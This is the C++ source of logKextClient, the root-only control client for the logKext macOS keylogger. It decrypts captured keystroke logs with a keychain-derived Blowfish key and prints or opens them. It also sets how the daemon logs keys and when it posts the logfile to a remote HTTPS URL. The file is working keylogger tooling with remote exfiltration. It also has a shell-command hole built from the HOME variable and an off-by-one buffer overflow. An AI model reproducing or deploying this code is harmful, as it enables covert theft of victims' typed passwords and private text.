/*
	logKextClient.cpp
	logKext

   Copyright 2007 Braden Thomas

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
*/

#include <unistd.h>
#include <stdio.h>
#include <sys/errno.h>
#include <sys/stat.h>
#include <openssl/blowfish.h>
#include <openssl/md5.h>
#include <Security/Security.h>
#include <openssl/rand.h>

#include <CoreFoundation/CoreFoundation.h>

#include "logKextCommon.h"
#include "logKextClient.h"

/**********Function Declarations*************/

long			file_length(CFStringRef);
CFStringRef		decrypt_file(CFStringRef);
void			PrintLogfileStatus();
void			print_usage();
void			print_set_usage();
bool			verify_pass();
bool			prefsOK();
void			makeEncryptKey();

BF_KEY			encrypt_bf_key;

/****** Main ********/

int main(int argc, char * argv[])
{
	if (geteuid())
	{
		printf("Must run as superuser.  Please use sudo.\n");
		exit(EACCES);
	}
	if (!prefsOK())
	{
		printf("Error: logKext Preferences cannot be found.  Is logKextDaemon running?\n");
		return 1;
	}
	
	CFPreferencesAppSynchronize(PREF_DOMAIN);
	
	if (!verify_pass())
		return EACCES;

	makeEncryptKey();
	PrintLogfileStatus();

	printf("Type 'help' for usage help, or 'quit' to quit.\n");
	
	while (1)
	{
		printf("\nlogKextClient > ");
		fflush(0);
		
		char line[1024+1];
		if (!fgets(line, 1024, stdin))
			break;
		// remove newline
		line[strlen(line)-1]=0;
				
		CFStringRef command = CFStringCreateWithCString(kCFAllocatorDefault,line,kCFStringEncodingASCII);

		if ((CFStringCompare(command,CFSTR("quit"),0)==kCFCompareEqualTo)||(CFStringCompare(command,CFSTR("q"),0)==kCFCompareEqualTo))
		{
			CFPreferencesAppSynchronize(PREF_DOMAIN);
			CFRelease(command);
			return 0;
		}
		if (CFStringCompare(command,CFSTR("help"),0)==kCFCompareEqualTo)
		{
			print_usage();
			CFRelease(command);
			continue;
		}
				
		CFArrayRef stringParts = CFStringCreateArrayBySeparatingStrings(kCFAllocatorDefault,command,CFSTR(" "));
		CFRelease(command);
		if (!CFArrayGetCount(stringParts))
			continue;

		if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(stringParts,0),CFSTR("info"),0)==kCFCompareEqualTo)
		{
			if (CFArrayGetCount(stringParts)==1)
			{
				printf("\nPossible variables: \n");
				printf("\tLogging\t\tMinMeg\n\tLogPath\t\tPassword\n\tEncrypt\t\tMods\n\tSendFreq\tSendByte\n\tSslUrl\n");
				printf("\nUse 'info variable' to get information on a specific variable.\n\n");
				CFRelease(stringParts);
				continue;
			}
			if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(stringParts,1),CFSTR("Logging"),0)==kCFCompareEqualTo)
			{
				printf("Logging controls whether the daemon is logging keystrokes (default is on).\n");
				printf("Possible Values: on/off\n");
			}
			else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(stringParts,1),CFSTR("MinMeg"),0)==kCFCompareEqualTo)
			{
				printf("MinMeg controls the minimum number of megs on the filesystem before logKext shuts down (default is 20).\n");
				printf("Possible Values: Integer greater than 20\n");
			}
			else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(stringParts,1),CFSTR("LogPath"),0)==kCFCompareEqualTo)
			{
				printf("LogPath controls the pathname of the log file location (default is /Library/Preferences/Library/Preferences/com.fsb.logKext).\n");
				printf("Possible Values: Valid file path\n");
			}
			else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(stringParts,1),CFSTR("Password"),0)==kCFCompareEqualTo)
			{
				printf("Password is your password used to control access to this client.\n");
				printf("Possible Values: Password String\n");
			}
			else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(stringParts,1),CFSTR("Encrypt"),0)==kCFCompareEqualTo)
			{
				printf("Encrypt controls whether or not the logfile will be encrypted or cleartext.\n");
				printf("Possible Values: on/off\n");
			}
			else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(stringParts,1),CFSTR("Mods"),0)==kCFCompareEqualTo)
			{
				printf("Mods controls whether or not modifier keys are logged in the logfile.\n--Modifier keys are non-character keys like <CMD> and <DEL>.\n");
				printf("Possible Values: on/off\n");
			}
			else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(stringParts,1),CFSTR("SendFreq"),0)==kCFCompareEqualTo)
			{
				printf("SendFreq controls the minimum time in hours between sending the logfile to the remote host.\n");
				printf("Default Value: %dh\n", DEFAULT_SENDFREQ);
			}
			else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(stringParts,1),CFSTR("SendByte"),0)==kCFCompareEqualTo)
			{
				printf("SendByte controls the minimum logfile size that will be sent to the remote host.\n");
				printf("Default Value: %d\n", DEFAULT_SENDBYTE);
			}
			else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(stringParts,1),CFSTR("SslUrl"),0)==kCFCompareEqualTo)
			{
				printf("SslUrl is the https url for posting the logfile.\n--Same as the form action attribute from HTML.\n--The logfile will be posted as a parameter to the SslUrl named 'logfile'.\n");
				printf("Possible Value: https://example.com/savepost.php\n");
			}
			else
			{
				printf("\nPossible variables: \n");
				printf("\tLogging\t\tMinMeg\n\tLogPath\t\tPassword\n\tEncrypt\t\tMods\n\tSendFreq\tSendByte\n\tSslUrl\n");
				printf("\nUse 'info variable' to get information on a specific variable.\n\n");
			}
			CFRelease(stringParts);
			continue;
		}
		if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(stringParts,0),CFSTR("open"),0)==kCFCompareEqualTo)
		{
			CFStringRef filePath;
			if (!getenv("HOME"))
				filePath = CFSTR("/tmp/out_logFile.txt");
			else
				filePath = CFStringCreateWithFormat(kCFAllocatorDefault,NULL,CFSTR("%s/Desktop/out_logFile.txt"),getenv("HOME"));
			
			CFStringRef pathName = (CFStringRef)CFPreferencesCopyAppValue(CFSTR("Pathname"),PREF_DOMAIN);
			long file_len = file_length(pathName);
			if (file_len)
			{
				CFStringRef decryptedBuf = decrypt_file(pathName);
				if (!decryptedBuf)
					printf("There was an error decrypting the logfile.\n");
				else
				{
					CFURLRef fileURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault,filePath,kCFURLPOSIXPathStyle,false);
					CFWriteStreamRef logStream = CFWriteStreamCreateWithFile(kCFAllocatorDefault,fileURL);
					CFRelease(fileURL);
					CFWriteStreamOpen(logStream);
					if (!logStream)
					{
						printf("Error saving file\n");
						CFRelease(decryptedBuf);
						CFRelease(stringParts);
						CFRelease(filePath);
						CFRelease(pathName);
						continue;
					}
					CFWriteStreamWrite(logStream,(const UInt8*)CFStringGetCStringPtr(decryptedBuf,CFStringGetFastestEncoding(decryptedBuf)),CFStringGetLength(decryptedBuf));
					CFWriteStreamClose(logStream);
					CFRelease(decryptedBuf);
					CFRelease(logStream);

					printf("Wrote file to: %s\n", CFStringGetCStringPtr(filePath,CFStringGetFastestEncoding(filePath)));

					char sysCommand[256];
					char sysCommandTwo[256];
					snprintf(sysCommand,256,"/usr/bin/open -e %s",CFStringGetCStringPtr(filePath,CFStringGetFastestEncoding(filePath)));
					snprintf(sysCommandTwo,256,"/usr/bin/open %s",CFStringGetCStringPtr(filePath,CFStringGetFastestEncoding(filePath)));
					
					if (system(sysCommand))
						system(sysCommandTwo);

				}
			}
			else
			{
				printf("The logfile does not currently exist.  ");
				printf("Maybe you haven't typed 100 keystrokes since starting a new logfile.\n");
			}
			CFRelease(pathName);
			CFRelease(filePath);
			CFRelease(stringParts);
			continue;
		}
		if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(stringParts,0),CFSTR("print"),0)==kCFCompareEqualTo)
		{	
			CFStringRef pathName = (CFStringRef)CFPreferencesCopyAppValue(CFSTR("Pathname"),PREF_DOMAIN);
			long file_len = file_length(pathName);
			if (file_len)
			{
				CFStringRef decryptedBuf = decrypt_file(pathName);
				if (!decryptedBuf)
					printf("There was an error decrypting decrypting the logfile.\n");
				else
				{
					printf("%s\n",CFStringGetCStringPtr(decryptedBuf,CFStringGetFastestEncoding(decryptedBuf)));
					CFRelease(decryptedBuf);
				}
			}
			else
			{
				printf("The logfile does not currently exist.  ");
				printf("Maybe you haven't typed 100 keystrokes since starting a new logfile.\n");
			}
			if(pathName)
				CFRelease(pathName);
			continue;
		}
		if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(stringParts,0),CFSTR("list"),0)==kCFCompareEqualTo)
		{
			Boolean			validKey;
			unsigned int	intVal;
			CFStringRef		strVal; // Don't forget to CFRelease every created object reference!
			
			printf("\nCurrent preference variable values:\n");
			
			printf("Logging:\t");
			if (CFPreferencesGetAppBooleanValue(CFSTR("Logging"),PREF_DOMAIN,NULL))
				printf("on\n");
			else
				printf("off\n");
			
			printf("MinMeg:\t\t");
			intVal = CFPreferencesGetAppIntegerValue(CFSTR("MinMeg"),PREF_DOMAIN,&validKey);
			if(validKey)
				printf("%d\n",intVal);
			else
				printf("[undefined\n");
			
			printf("LogPath:\t");
			strVal = (CFStringRef)CFPreferencesCopyAppValue(CFSTR("Pathname"),PREF_DOMAIN);
			if(strVal)
			{
				printf("%s\n", CFStringGetCStringPtr(strVal,CFStringGetSystemEncoding()));
				CFRelease(strVal);
			}
			else
				printf("[undefined]\n");
			
			printf("Password:\tCannot be listed.\n");
			
			printf("Encrypt:\t");
			if (CFPreferencesGetAppBooleanValue(CFSTR("Encrypt"),PREF_DOMAIN,NULL))
				printf("on\n");
			else
				printf("off\n");
			
			printf("Mods:\t\t");
			if (CFPreferencesGetAppBooleanValue(CFSTR("Mods"),PREF_DOMAIN,NULL))
				printf("on\n");
			else
				printf("off\n");
			
			printf("SendFreq:\t");
			intVal = CFPreferencesGetAppIntegerValue(CFSTR("SendFreq"),PREF_DOMAIN,&validKey);
			if(validKey)
				printf("%dh\n",intVal);
			else
				printf("[undefined]\n");
			
			printf("SendByte:\t");
			intVal = CFPreferencesGetAppIntegerValue(CFSTR("SendByte"),PREF_DOMAIN,&validKey);
			if(validKey)
				printf("%d\n",intVal);
			else
				printf("[undefined]\n");
			
			printf("SslUrl:\t\t");
			strVal = (CFStringRef)CFPreferencesCopyAppValue(CFSTR("SslUrl"),PREF_DOMAIN);
			if(strVal)
			{
				printf("%s\n", CFStringGetCStringPtr(strVal,CFStringGetSystemEncoding()));
				CFRelease(strVal);
			}
			else
				printf("[undefined]\n");
			
			printf("\nUse the 'set' command to change preference variables.\n\n");
			continue;
		}
		if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(stringParts,0),CFSTR("set"),0)==kCFCompareEqualTo)
		{
			if (CFArrayGetCount(stringParts)==1)
			{
				print_set_usage();
				continue;
			}
			
			CFArrayRef setParts = CFStringCreateArrayBySeparatingStrings(kCFAllocatorDefault,(CFStringRef)CFArrayGetValueAtIndex(stringParts,1),CFSTR("="));
			if (CFArrayGetCount(setParts)!=2)
			{
				print_set_usage();
				CFRelease(setParts);
				continue;			
			}
			
			if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(setParts,0),CFSTR("Logging"),0)==kCFCompareEqualTo)
			{
				if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(setParts,1),CFSTR("on"),0)==kCFCompareEqualTo)
				{
					CFPreferencesSetAppValue(CFSTR("Logging"),kCFBooleanTrue,PREF_DOMAIN);
					printf("\nLogging set to on.\n");
				}
				else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(setParts,1),CFSTR("off"),0)==kCFCompareEqualTo)
				{
					CFPreferencesSetAppValue(CFSTR("Logging"),kCFBooleanFalse,PREF_DOMAIN);
					printf("\nLogging set to off.\n");
				}
				else
				{
					printf("Logging controls whether the daemon is logging keystrokes (default is on).\n");
					printf("Possible Values: on/off\n");
				}				
			}
			else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(setParts,0),CFSTR("MinMeg"),0)==kCFCompareEqualTo)
			{
				CFNumberFormatterRef nFrm = CFNumberFormatterCreate(kCFAllocatorDefault,CFLocaleCopyCurrent(),kCFNumberFormatterNoStyle);
				CFNumberRef outNum = CFNumberFormatterCreateNumberFromString(kCFAllocatorDefault,nFrm,(CFStringRef)CFArrayGetValueAtIndex(setParts,1),NULL,kCFNumberFormatterParseIntegersOnly);
				CFRelease(nFrm);
				int megDef = DEFAULT_MEG;
				CFNumberRef megDefNum = CFNumberCreate(kCFAllocatorDefault,kCFNumberIntType,&megDef);
				if (CFNumberCompare(outNum,megDefNum,NULL)==kCFCompareLessThan)
					CFPreferencesSetAppValue(CFSTR("MinMeg"),megDefNum,PREF_DOMAIN);
				else
					CFPreferencesSetAppValue(CFSTR("MinMeg"),outNum,PREF_DOMAIN);
				CFRelease(megDefNum);
				int outNumInt;
				CFNumberGetValue(outNum,kCFNumberIntType,&outNumInt);
				CFRelease(outNum);
				printf("MinMeg set to %d\n",outNumInt);
			}
			else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(setParts,0),CFSTR("LogPath"),0)==kCFCompareEqualTo)
			{
				CFStringRef newVal = (CFStringRef)CFArrayGetValueAtIndex(setParts,1);
				CFPreferencesSetAppValue(CFSTR("Pathname"),newVal,PREF_DOMAIN);
				printf("\nLogfile location changed to %s\nDelete your old logfile for this to take effect.\n", CFStringGetCStringPtr(newVal,CFStringGetFastestEncoding(newVal)));
			}
			else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(setParts,0),CFSTR("Password"),0)==kCFCompareEqualTo)
			{
				unsigned char md5[16];
				MD5((unsigned char*)CFStringGetCStringPtr((CFStringRef)CFArrayGetValueAtIndex(setParts,1),CFStringGetFastestEncoding((CFStringRef)CFArrayGetValueAtIndex(setParts,1))),CFStringGetLength((CFStringRef)CFArrayGetValueAtIndex(setParts,1)),md5);
				char hash[32];
				for (int i=0; i< 16; i++)
					sprintf(hash+2*i,"%02x",md5[i]);
				
				CFStringRef p = CFStringCreateWithCString(kCFAllocatorDefault,hash,kCFStringEncodingASCII);
				CFPreferencesSetAppValue(CFSTR("Password"),p,PREF_DOMAIN);
				CFRelease(p);
				printf("\nPassword changed.\nDelete your logfile for this to take effect.  A new logfile will be created encrypted with your new password.\n");
			}
			else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(setParts,0),CFSTR("Encrypt"),0)==kCFCompareEqualTo)
			{
				if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(setParts,1),CFSTR("on"),0)==kCFCompareEqualTo)
				{
					CFPreferencesSetAppValue(CFSTR("Encrypt"),kCFBooleanTrue,PREF_DOMAIN);
					printf("\nEncrypt set to on.\nDelete your logfile for this to take effect.\n");
				}
				else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(setParts,1),CFSTR("off"),0)==kCFCompareEqualTo)
				{
					CFPreferencesSetAppValue(CFSTR("Encrypt"),kCFBooleanFalse,PREF_DOMAIN);
					printf("\nEncrypt set to off.\nDelete your logfile for this to take effect.\n");
				}
				else
				{
					printf("Encrypt controls whether or not the logfile will be encrypted or cleartext.\n");
					printf("Possible Values: on/off\n");
				}
			}
			else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(setParts,0),CFSTR("Mods"),0)==kCFCompareEqualTo)
			{
				if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(setParts,1),CFSTR("on"),0)==kCFCompareEqualTo)
				{
					CFPreferencesSetAppValue(CFSTR("Mods"),kCFBooleanTrue,PREF_DOMAIN);
					printf("\nMods set to on.\nDelete your logfile for this to take effect.\n");
				}
				else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(setParts,1),CFSTR("off"),0)==kCFCompareEqualTo)
				{
					CFPreferencesSetAppValue(CFSTR("Mods"),kCFBooleanFalse,PREF_DOMAIN);
					printf("\nMods set to off.\nDelete your logfile for this to take effect.\n");
				}
				else
				{
					printf("Mods controls whether or not modifier keys are logged in the logfile.\n--Modifier keys are non-character keys like <CMD> and <DEL>.\n");
					printf("Possible Values: on/off\n");
				}
			}
			else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(setParts,0),CFSTR("SendFreq"),0)==kCFCompareEqualTo)
			{
				CFNumberFormatterRef nFrm = CFNumberFormatterCreate(kCFAllocatorDefault,CFLocaleCopyCurrent(),kCFNumberFormatterNoStyle);
				CFNumberRef outNum = CFNumberFormatterCreateNumberFromString(kCFAllocatorDefault,nFrm,(CFStringRef)CFArrayGetValueAtIndex(setParts,1),NULL,kCFNumberFormatterParseIntegersOnly);
				CFRelease(nFrm);
				int freqMin = 0;
				CFNumberRef freqMinNum = CFNumberCreate(kCFAllocatorDefault,kCFNumberIntType,&freqMin);
				if (CFNumberCompare(outNum,freqMinNum,NULL)==kCFCompareLessThan)
					CFPreferencesSetAppValue(CFSTR("SendFreq"),freqMinNum,PREF_DOMAIN);
				else
					CFPreferencesSetAppValue(CFSTR("SendFreq"),outNum,PREF_DOMAIN);
				CFRelease(freqMinNum);
				int outNumInt;
				CFNumberGetValue(outNum,kCFNumberIntType,&outNumInt);
				CFRelease(outNum);
				printf("SendFreq set to %dh\n",outNumInt);
			}
			else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(setParts,0),CFSTR("SendByte"),0)==kCFCompareEqualTo)
			{
				CFNumberFormatterRef nFrm = CFNumberFormatterCreate(kCFAllocatorDefault,CFLocaleCopyCurrent(),kCFNumberFormatterNoStyle);
				CFNumberRef outNum = CFNumberFormatterCreateNumberFromString(kCFAllocatorDefault,nFrm,(CFStringRef)CFArrayGetValueAtIndex(setParts,1),NULL,kCFNumberFormatterParseIntegersOnly);
				CFRelease(nFrm);
				int min = DEFAULT_SENDBYTE;
				CFNumberRef megMinNum = CFNumberCreate(kCFAllocatorDefault,kCFNumberIntType,&min);
				if (CFNumberCompare(outNum,megMinNum,NULL)==kCFCompareLessThan)
					CFPreferencesSetAppValue(CFSTR("SendByte"),megMinNum,PREF_DOMAIN);
				else
					CFPreferencesSetAppValue(CFSTR("SendByte"),outNum,PREF_DOMAIN);
				CFRelease(megMinNum);
				int outNumInt;
				CFNumberGetValue(outNum,kCFNumberIntType,&outNumInt);
				CFRelease(outNum);
				printf("SendByte set to %d\n",outNumInt);
			}
			else if (CFStringCompare((CFStringRef)CFArrayGetValueAtIndex(setParts,0),CFSTR("SslUrl"),0)==kCFCompareEqualTo)
			{
				CFStringRef newVal = (CFStringRef)CFArrayGetValueAtIndex(setParts,1);
				CFPreferencesSetAppValue(CFSTR("SslUrl"),newVal,PREF_DOMAIN);
				printf("\nSslUrl changed to %s\n", CFStringGetCStringPtr(newVal,CFStringGetFastestEncoding(newVal)));
			}
			else
			{
				print_set_usage();
			}
			CFRelease(setParts);
			CFPreferencesAppSynchronize(PREF_DOMAIN);
			continue;
		}
	}
	return 0;
}

void PrintLogfileStatus()
{
	CFStringRef pathName = (CFStringRef)CFPreferencesCopyAppValue(CFSTR("Pathname"),PREF_DOMAIN);
	
	struct stat fileStat;
	printf("\nCurrent logfile status: ");
	if (stat(CFStringGetCStringPtr(pathName,CFStringGetFastestEncoding(pathName)),&fileStat))
		printf("File does not exist.\n");
	else
	{
		if (fileStat.st_size<1024)
			printf("%lld bytes.\n",(long long)fileStat.st_size);
		else if (fileStat.st_size<(1024*1024))
			printf("%lld kilobytes.\n",(long long)fileStat.st_size/1024);
		else if (fileStat.st_size<(1024*1024*1024))
			printf("%lld megabytes.\n",(long long)fileStat.st_size/(1024*1024));
		else
			printf("%lld gigabytes.\n",(long long)fileStat.st_size/(1024*1024*1024));
	}
	CFRelease(pathName);
}

bool prefsOK()	// non-exhaustive check
{
	CFStringRef password = (CFStringRef)CFPreferencesCopyAppValue(CFSTR("Password"),PREF_DOMAIN);
	if (!password)
		return false;
	CFRelease(password);
	return true;
}

bool verify_pass()
{
	char *clear_pass = getpass("logKext Password:");

	unsigned char md5[16];
	MD5((unsigned char*)clear_pass,strlen(clear_pass),md5);
	char hash[32];
	for (int i=0; i< 16; i++)
		sprintf(hash+2*i,"%02x",md5[i]);
	
	CFStringRef password = (CFStringRef)CFPreferencesCopyAppValue(CFSTR("Password"),PREF_DOMAIN);
	if(!password)
	{
		printf("Password variable not set\n");
		return false;
	}
	CFStringRef userPass = CFStringCreateWithCString(kCFAllocatorDefault,hash,kCFStringEncodingASCII);
	
	if (CFStringCompare(password,userPass,0)!=kCFCompareEqualTo)
	{
		printf("Incorrect Password\n");
		CFRelease(password);
		CFRelease(userPass);
		return false;
	}
	CFRelease(password);
	CFRelease(userPass);
	return true;
}

void print_usage()
{
	printf("\nLogKext v2.3 Interactive Client");
	printf("\nCommands:\n");
	printf("list:\tLists all current daemon preference variable values.\n");
	printf("open:\tOpens (and decrypts if necessary) logfile.\n");
	printf("print:\tPrints to terminal (and decrypts if necessary) logfile.\n");
	printf("help:\tShows this help screen.\n");
	printf("info:\tGives information on a preference variable.\n");
	printf("\tUsage: \'info variable\'\n");
	printf("set:\tSets new daemon preference variable value.\n");
	printf("\tUsage: \'set variable=value\'\n");
	printf("quit:\tQuits client.\n\n");
}

void print_set_usage()
{
	printf("\nUse 'set variable=value' to change your preferences.\n");
	printf("Type 'info' to get information on all preference variables and possible values.\n");
	printf("Use 'list' to get current values of your preference variables.\n\n");
}

bool notAscii(char in)
{
	return (in < 9 || in > 126);
}

CFStringRef decrypt_file(CFStringRef pathName)
{
	Boolean validKey;
	Boolean doEncrypt = CFPreferencesGetAppBooleanValue(CFSTR("Encrypt"),PREF_DOMAIN,&validKey);

	CFMutableStringRef outFile = CFStringCreateMutable(kCFAllocatorDefault,0);
	CFURLRef url = CFURLCreateWithFileSystemPath(kCFAllocatorDefault,pathName,kCFURLPOSIXPathStyle,false);
	CFReadStreamRef readStream = CFReadStreamCreateWithFile(kCFAllocatorDefault,url);
	CFRelease(url);
	if (!readStream||!(CFReadStreamOpen(readStream)))
	{
		if(outFile)
			CFRelease(outFile);
		if(readStream)
			CFRelease(readStream);
		return NULL;
	}

	CFMutableDataRef fileData = CFDataCreateMutable(kCFAllocatorDefault,8);

	while (CFReadStreamHasBytesAvailable(readStream))
	{
		CFReadStreamRead(readStream,CFDataGetMutableBytePtr(fileData),8);
		if (doEncrypt)
		{
			CFMutableDataRef plainData = CFDataCreateMutable(kCFAllocatorDefault,8);
			BF_ecb_encrypt(CFDataGetBytePtr(fileData),CFDataGetMutableBytePtr(plainData),&encrypt_bf_key,BF_DECRYPT);

			// this prevents screwed up strings from corrupting the logfile
			unsigned char* bytePtr = (unsigned char*)CFDataGetBytePtr(plainData);
			bool isAscii = true;
			for (int i=0;i<8;i++)
				if (notAscii(bytePtr[i]))
					isAscii = false;
			if (isAscii)
			{
				CFStringRef s = CFStringCreateWithBytes(kCFAllocatorDefault,CFDataGetBytePtr(plainData),8,kCFStringEncodingASCII,false);
				CFStringAppend(outFile,s);
				CFRelease(s);
			}
			CFRelease(plainData);
		}
		else
		{
			CFStringRef s = CFStringCreateWithBytes(kCFAllocatorDefault,CFDataGetBytePtr(fileData),8,kCFStringEncodingASCII,false);
			CFStringAppend(outFile,s);
			CFRelease(s);
		}
	}
	CFRelease(fileData);
	CFReadStreamClose(readStream);
	CFRelease(readStream);
	return outFile;	
}

long file_length(CFStringRef pathName)
{
	FILE * logFile;
	struct stat fileStat;
	if (stat(CFStringGetCStringPtr(pathName,CFStringGetFastestEncoding(pathName)),&fileStat))
		return 0;
	else
		logFile = fopen(CFStringGetCStringPtr(pathName,CFStringGetFastestEncoding(pathName)),"r");

	if (!logFile)
		return 0;
		
	fseek(logFile,0,SEEK_END);
	long file_length = ftell(logFile);
	rewind(logFile);
	fclose(logFile);
	
	return file_length;
}

void makeEncryptKey()
{
	SecKeychainRef sysChain;
	OSStatus secRes = SecKeychainOpen("/Library/Keychains/System.keychain", &sysChain);
	if (secRes)
	{
		printf("Couldn't get system keychain: %ld\n",(unsigned long)secRes);
		return;
	}

	CFStringRef password = (CFStringRef)CFPreferencesCopyAppValue(CFSTR("Password"),PREF_DOMAIN);
	if (!password)
		return;

	UInt32 passLen;
	void* passData;
	secRes = SecKeychainFindGenericPassword(sysChain, strlen("logKextPassKey"), "logKextPassKey", NULL, NULL, &passLen, &passData, NULL);
	if (secRes)
	{
		printf("Error finding passKey in keychain (%ld). Failing\n",(unsigned long)secRes);
		exit(-1);
	}
/*	
	printf("Using encryption key %02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x\n",
		((char*)passData)[0]&0xff,((char*)passData)[1]&0xff,((char*)passData)[2]&0xff,((char*)passData)[3]&0xff,
		((char*)passData)[4]&0xff,((char*)passData)[5]&0xff,((char*)passData)[6]&0xff,((char*)passData)[7]&0xff,
		((char*)passData)[8]&0xff,((char*)passData)[9]&0xff,((char*)passData)[10]&0xff,((char*)passData)[11]&0xff,
		((char*)passData)[12]&0xff,((char*)passData)[13]&0xff,((char*)passData)[14]&0xff,((char*)passData)[15]&0xff);
*/
	BF_KEY temp_key;
	BF_set_key(&temp_key,passLen,(unsigned char*)passData);
	unsigned char *encrypt_key = new unsigned char[8];
	BF_ecb_encrypt((const unsigned char*)CFStringGetCStringPtr(password,CFStringGetFastestEncoding(password)),encrypt_key,&temp_key,BF_ENCRYPT);
	BF_set_key(&encrypt_bf_key,8,encrypt_key);
	CFRelease(password);
	
	return;
}
